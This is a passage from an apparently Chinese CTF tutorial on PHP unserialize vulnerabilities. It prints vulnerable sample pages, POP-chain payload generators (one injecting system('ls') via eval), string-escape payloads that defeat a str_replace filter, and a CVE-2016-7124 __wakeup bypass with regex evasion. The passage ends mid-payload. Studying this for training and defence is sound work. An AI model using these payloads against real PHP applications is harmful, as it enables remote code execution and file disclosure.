class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">index</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">normal</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-comment">//反序列化unserialize()触发魔术方法destruct()</span><br>        <span class="hljs-variable language_">$this</span>-&gt;test-&gt;<span class="hljs-title function_ invoke__">action</span>();  <span class="hljs-comment">//destruct()从$test调用action()</span><br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">normal</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;please attack me&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test2</span>;  <span class="hljs-comment">//eval()调用$tset2</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;test2);  <span class="hljs-comment">//可利用漏洞点在函数eval() （可以执行命令）</span><br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>关联点：</strong>如何让<code>$tset</code>调用<code>evil</code>里的成员方法<code>action()</code></p><p><strong>解决思路：</strong>给<code>$test</code>赋值为对象<code>test = new evil()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">index</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test2</span> = <span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">index</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-comment">//O%3A5%3A%22index%22%3A1%3A%7Bs%3A11%3A%22%00index%00test%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A5%3A%22test2%22%3Bs%3A13%3A%22system%28%27ls%27%29%3B%22%3B%7D%7D</span><br></code></pre></td></tr></table></figure><p>1.构造命令语句</p><p>2.实例化对象<code>index()</code>，自动调用<code>__construct()</code></p><p>3.关联步骤：给<code>$test</code>赋值实例化对象 <code>test = new evil()</code></p><p>此时<code>$a</code>为实例化对象<code>index()</code>，其中成员属性<code>$test = new evil()</code>，<code>$test</code>为实例化对象<code>evil()</code>，成员属性<code>$test2 = &quot;system(&#39;ls&#39;);&quot;</code></p><p><strong>例题二：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fast</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;  <span class="hljs-comment">//$source = object sec</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wakeup is here!!&quot;</span>;<br>        <span class="hljs-keyword">echo</span>  <span class="hljs-variable language_">$this</span>-&gt;source;  <span class="hljs-comment">//在echo中的source包含实例化sec()的对象</span><br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sec</span> </span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$benben</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;   <span class="hljs-comment">//把sec()实例化成对象后当成字符串输出</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;tostring is here!!&quot;</span>;  <span class="hljs-comment">//需要触发__tostring()</span><br>    &#125;<br>&#125;<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;benben&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在对象<code>$a</code>里让<code>source</code>赋值对象<code>$b</code></p><p>在触发<code>wakeup</code>后执行<code>echo</code>从而触发<code>sec</code>里的<code>__toString</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fast</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">sec</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$benben</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">sec</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">fast</span>();<br><br><span class="hljs-variable">$b</span> -&gt; source =<span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-comment">//O:4:&quot;fast&quot;:1:&#123;s:6:&quot;source&quot;;O:3:&quot;sec&quot;:1:&#123;s:6:&quot;benben&quot;;N;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p><strong>例题三：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in flag.php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>1.目标：触发echo，调用$flag</p><p>2.第一步：触发invoke，调用append，并使$var&#x3D;flag.php（invoke触发条件：把对象当成函数）</p><p>3.给$p赋值为对象，即function成为对象Modifier，却被当成函数调用，触发Modifier中的invoke</p><p>4.第二步：触发get（触发条件：调用不存在的成员属性）</p><p>5.给$str赋值为对象Test，而Test中不存在成员属性source，则可触发Test里的成员方法get</p><p>6.第三步：触发toString（触发条件：把对象当成字符串）</p><p>7.给$source赋值为对象Show，当成字符串被echo调用，触发toString</p><p>8.最终步：触发wakeup（触发条件：反序列化unserialize）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//flag is in flag.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>&#125;<br><br><span class="hljs-variable">$mod</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Modifier</span>();<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$test</span>-&gt;p = <span class="hljs-variable">$mod</span>;<br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$show</span>-&gt;source = <span class="hljs-variable">$show</span>;<br><span class="hljs-variable">$show</span>-&gt;str = <span class="hljs-variable">$test</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$show</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h3><p>一般在数据先经过一次<code>serialize</code>再经过<code>unserialize</code>，在这个中间反序列化的<code>字符串变多</code>或者<code>变少</code>的时候才有可能存在反序列化<code>属性逃逸</code></p><p><strong>字符串逃逸增多例题：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>    <span class="hljs-variable">$safe</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;php&quot;</span>);<br>    <span class="hljs-variable">$name</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$safe</span>,<span class="hljs-string">&quot;hack&quot;</span>,<span class="hljs-variable">$name</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$name</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;daydream&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$param</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>];<br><span class="hljs-variable">$param</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-variable">$param</span>));<br><span class="hljs-variable">$profile</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$param</span>));<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$profile</span>-&gt;pass==<span class="hljs-string">&#x27;escaping&#x27;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>目标逃逸代码：<code>s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;</code></p><p><code>php</code>被替换成<code>hack</code>，字符串会增多，会吐出字符串变成结构代码，一个<code>php</code>吐出一个字符，共需要吐出29个字符，包括补全结构<code>&quot;;</code></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Payload:<br>phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp<span class="hljs-string">&quot;;s:4:&quot;</span>pass<span class="hljs-string">&quot;;s:8:&quot;</span>escaping<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><strong>字符串逃逸减少例题：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>    <span class="hljs-variable">$safe</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;php&quot;</span>);<br>    <span class="hljs-variable">$name</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-variable">$safe</span>,<span class="hljs-string">&quot;hk&quot;</span>,<span class="hljs-variable">$name</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$name</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$user</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$vip</span> = <span class="hljs-literal">false</span> ;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>,<span class="hljs-variable">$pass</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-variable">$user</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;pass=<span class="hljs-variable">$pass</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$param</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br><span class="hljs-variable">$pass</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>];<br><span class="hljs-variable">$param</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-variable">$param</span>,<span class="hljs-variable">$pass</span>));<br><span class="hljs-variable">$profile</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$param</span>));<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$profile</span>-&gt;vip)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>flag</code>被替换成<code>hk</code>，字符串减少，会吃掉后面的结构代码，吃完<code>&quot;;s:4&quot;pass&quot;;s:6&quot;</code>后，<code>$pass</code>的值<code>benben</code>可控，字符串逃逸</p><p><code>flag-&gt;hk</code>，吃一次少2个字符，要吃够19位最少要吃10次，多吃1位在后面补</p><p>需要吃掉的字符：<code>1&quot;;s:4&quot;pass&quot;;s:6:&quot;benben&quot;;s:3:&quot;vip&quot;;b:1&#125;</code></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Payload：<br><span class="hljs-attribute">user</span><span class="hljs-operator">=</span>flagflagflagflagflagflagflagflagflagflag<br><span class="hljs-attribute">pass</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&quot;;s:4:&quot;</span>pass<span class="hljs-string">&quot;;s:6:&quot;</span>benben<span class="hljs-string">&quot;;s:3:&quot;</span>vip<span class="hljs-string">&quot;;b:1;&#125;</span><br></code></pre></td></tr></table></figure><h3 id="wakeup魔术方法绕过"><a href="#wakeup魔术方法绕过" class="headerlink" title="wakeup魔术方法绕过"></a>wakeup魔术方法绕过</h3><p><strong>反序列化漏洞：</strong>CVE-2016-7124</p><p><strong>PHP版本限制：</strong>PHP5&lt;5.6.25；PHP7&lt;7.0.10</p><p><strong>漏洞产生原因：</strong>如果存在<code>__wakeup()</code>方法，调用<code>unserilize()</code>方法前则先调用<code>__wakeup()</code>方法，但是序列化字符串中表示对象<strong>属性个数</strong>的值大于真实个数的属性个数时，会跳过<code>__wakeup()</code>的执行</p><p>例题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">secret</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;file=<span class="hljs-variable">$file</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-comment">//__destruct()会在反序列化之后触发</span><br>        <span class="hljs-keyword">include_once</span>(<span class="hljs-variable language_">$this</span>-&gt;file);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;file=<span class="hljs-string">&#x27;index.php&#x27;</span>;  <span class="hljs-comment">//__wakeup()在反序列化之前触发，会把file值改成&#x27;index.php&#x27;</span><br>    &#125;<br>&#125;<br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$cmd</span>))&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>,<span class="hljs-variable">$cmd</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Are you daydreaming?&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$cmd</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//sercet in flag.php</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解题方法：</p><p>原序列化字符串：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;secret&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>把成员属性的数量值修改为2，可以跳过<code>__wakeup()</code></p><p>将<code>O:6</code>写成<code>O:+6</code>可以绕过正则的判断</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:+<span class="hljs-number">6</span>:<span class="hljs-string">&quot;secret&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;file&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>进行<code>urlencode</code>后提交</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>B6%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>secret%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A4%<span 